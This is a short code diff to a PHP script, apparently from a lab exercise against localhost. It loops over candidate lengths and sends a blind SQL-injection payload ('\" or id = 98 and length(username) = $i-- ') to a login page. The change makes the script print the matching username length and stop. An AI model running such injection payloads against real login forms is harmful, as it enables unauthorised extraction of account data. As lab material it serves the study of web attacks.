@@ -9,8 +9,10 @@ while ($i < 25)
     $url="http://localhost/lab09/login.php?u=\"%20or%20id%20=%2098%20and%20length(username)%20=%20$i--%20";
 	$result = file_get_contents($url);
 	if (strpos($result, 'cat') !== false) {
-	echo "\n";
-	echo 'true';
+		echo "\n";
+		echo 'true';
+		print $i;
+		break;
 	}else{
 		echo "\n";
 		echo "nope";
